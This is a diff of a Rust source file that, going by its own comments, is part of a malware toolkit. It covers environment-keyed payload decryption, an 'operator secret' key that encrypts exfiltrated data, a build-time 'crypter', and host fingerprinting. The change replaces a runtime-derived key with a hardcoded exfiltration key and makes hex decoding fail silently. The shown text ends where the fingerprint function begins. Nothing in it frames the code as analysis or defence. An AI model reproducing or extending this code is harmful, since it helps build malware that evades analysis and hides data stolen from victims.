@@ -1,6 +1,16 @@
+//! Environment-keyed decryption.
+//!
+//! Two separate key materials live here:
+//!   - `EXFIL_KEY_HEX`  : operator secret, wraps every exfil payload.
+//!                        Same across all builds. Change it and every
+//!                        operator decryptor must change with it.
+//!   - `ENVKEY_SALT`    : per-build salt for the payload env-key. The
+//!                        crypter generates the payload key material at
+//!                        build time; this salt is only used by the
+//!                        payload-side env-key derivation helper.
+
 use argon2::{Algorithm, Argon2, Params, Version};
 use serde::{Deserialize, Serialize};
-use sha2::{Digest, Sha256};
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
 pub struct Fingerprint {
@@ -30,55 +40,45 @@ pub fn derive_env_key(fp: &Fingerprint, salt: &[u8]) -> [u8; 32] {
     out
 }
 
-const ENVKEY_SALT: &[u8] = b"svc_salt_v3";
+// ─── exfil key ────────────────────────────────────────────────────
 
-static EXFIL_KEY: std::sync::OnceLock<[u8; 32]> = std::sync::OnceLock::new();
+/// Operator secret. Wraps every exfil payload with AES-256-GCM.
+/// Rotate by replacing this value AND the operator decryptor's default.
+const EXFIL_KEY_HEX: &str =
+    "c734ac039aa425a799ea638f8c72904eeb628d2cd3b5934fb489ef27ffa038ef";
+
+const ENVKEY_SALT: &[u8] = b"svc_salt_v2";
 
 pub fn runtime_exfil_key() -> [u8; 32] {
-    *EXFIL_KEY.get_or_init(|| {
-        let mut seed = [0u8; 32];
-        if let Ok(v) = std::env::var("SVC_BUILD_SEED") {
-            if let Ok(b) = hex_decode_fixed(&v) {
-                seed = b;
-            }
-        }
-        std::env::remove_var("SVC_BUILD_SEED");
-        let mut h = Sha256::new();
-        h.update(b"svc_exfil_key_v3");
-        h.update(seed);
-        let d = h.finalize();
-        let mut k = [0u8; 32];
-        k.copy_from_slice(&d);
-        k
-    })
+    let mut k = [0u8; 32];
+    hex_decode(EXFIL_KEY_HEX, &mut k);
+    k
 }
 
 pub fn runtime_envkey(fp: &Fingerprint) -> [u8; 32] {
     derive_env_key(fp, ENVKEY_SALT)
 }
 
-fn hex_decode_fixed(s: &str) -> Result<[u8; 32], ()> {
-    if s.len() != 64 {
-        return Err(());
-    }
+fn hex_decode(s: &str, out: &mut [u8]) {
     let bytes = s.as_bytes();
-    let mut out = [0u8; 32];
-    for i in 0..32 {
-        let hi = nib(bytes[i * 2]).ok_or(())?;
-        let lo = nib(bytes[i * 2 + 1]).ok_or(())?;
+    let n = out.len().min(bytes.len() / 2);
+    for i in 0..n {
+        let hi = nib(bytes[i * 2]);
+        let lo = nib(bytes[i * 2 + 1]);
         out[i] = (hi << 4) | lo;
     }
-    Ok(out)
 }
 
-fn nib(b: u8) -> Option<u8> {
+fn nib(b: u8) -> u8 {
     match b {
-        b'0'..=b'9' => Some(b - b'0'),
-        b'a'..=b'f' => Some(b - b'a' + 10),
-        b'A'..=b'F' => Some(b - b'A' + 10),
-        _ => None,
+        b'0'..=b'9' => b - b'0',
+        b'a'..=b'f' => b - b'a' + 10,
+        b'A'..=b'F' => b - b'A' + 10,
+        _ => 0,
     }
 }
+
+// ─── fingerprint capture ─────────────────────────────────────────
 
 pub fn fingerprint() -> Fingerprint {
     #[cfg(windows)]
